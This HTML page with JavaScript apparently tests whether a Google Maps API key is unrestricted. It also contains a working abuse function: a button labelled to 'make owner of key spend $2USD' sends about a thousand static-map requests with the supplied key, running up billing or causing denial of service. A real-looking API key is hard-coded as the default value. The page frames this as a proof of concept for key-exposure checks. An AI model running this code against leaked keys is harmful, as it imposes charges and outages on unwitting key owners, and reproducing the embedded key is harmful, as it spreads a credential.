<!DOCTYPE html>
<html>
  <head>
    <style>
      /* Set the size of the div element that contains the map */
      #map {
        height: 400px;  /* The height is 400 pixels */
        width: 100%;  /* The width is the width of the web page */
       }
    </style>
  </head>
  <body>
    <h2>Static Maps API Key Test by German Flores</h2>
    
    Insert Google API Key: <input type="text" id="KEY" value="AIzaSyCGOJbGQ95SWrXxl8wk-_cRQZcJl42bvDU"/>
 <input type="button" value="CheckKey"  onclick="showMap()" />

  
    <div id="map">
    <img id="mapImg"  onerror="keywellProtected()" />
    </div>
      <div id="resultmessage"> $ </div>
        <input type="button" id="run1000button" value="Run 1000 times and make owner of key spend $2USD"  onclick="show1000Maps()" style="visibility: hidden;"/>
      
    
    
    
    <script>
    function keywellProtected(){
     document.getElementById("run1000button").style.visibility = "hidden";
  document.getElementById("resultmessage").innerText = ' The key is well protected. That means 1.Google MAPS Static API is not enabled for this key  2. Is enabled but dont allow me to use from my domain. To check error visit https://maps.googleapis.com/maps/api/staticmap?center=40.714%2c%20-73.998&zoom=13&size=400x400&key='+document.getElementById("KEY").value;
     
    }
    
    function showMap(){
    		
	    	var apikey=document.getElementById("KEY").value;
	    	var mapstaticurl="https://maps.googleapis.com/maps/api/staticmap?center=40.714%2c%20-73.998&zoom=13&size=400x400&key="+apikey;
	    	document.getElementById("mapImg").src = mapstaticurl;    
  	    	document.getElementById("run1000button").style.visibility = "visible";
  		document.getElementById("resultmessage").innerText = 'WARNING!!!!!!KEY NOT PROTECTED.  I am using this key to plot a Maps in my website :)';
  		}
    
    
     function show1000Maps(){
	
	        var apikey=document.getElementById("KEY").value;
		var mapstaticurl;
		var message="WARNING!! This function will randomnly request 1000 maps on random location using the key above.   You will cause charges on the owner of that key or a Denial of Service if that account is not set billing .  The purpose of this function is to cause proof of concept.   Please don't use this for evil purposes";
		if(confirm(message)){
		    for (var i = 1; i < 999; i++) {
		 	    lat=Math.random()*180-90;
			    long=Math.random()*360-180;
			    console.log("Run"+i+" Lat:"+lat+" ,Long:"+long);
			    var mapstaticurl="https://maps.googleapis.com/maps/api/staticmap?center="+lat+"%2c%20"+long+"&zoom=9&size=400x400&key="+apikey;
		    	   document.getElementById("mapImg").src = mapstaticurl;
		    }
	    }
    }
    </script>
    
    </html>
    
  
    

  </body>
</html>
